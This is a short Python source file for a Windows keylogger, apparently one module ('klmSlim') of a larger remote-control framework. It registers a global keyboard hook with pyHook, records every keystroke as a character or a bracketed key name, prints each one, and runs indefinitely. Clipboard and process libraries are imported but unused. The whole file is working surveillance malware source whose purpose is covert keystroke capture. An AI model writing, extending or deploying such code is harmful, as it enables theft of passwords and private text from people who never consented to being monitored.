from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32			= windll.user32
kernel32		= windll.kernel32
psapi			= windll.psapi

def run(**args):
	print "[>] In klmSlim module."

	def KeyStroke(event):

		# if they pressed a standard key
		if event.Ascii > 32 and event.Ascii < 127:
			
			keyz = chr(event.Ascii)
			print (keyz)
			return str(keyz)

		else:
			othKeyz = "[%s]" % event.Key
			print (othKeyz)
			return str(othKeyz)

		# pass execution to next hook
		return True

	# create and register a hook manager
	k1		= pyHook.HookManager()
	k1.KeyDown	= KeyStroke

	# register the hook and excute forever
	k1.HookKeyboard()
	pythoncom.PumpMessages()
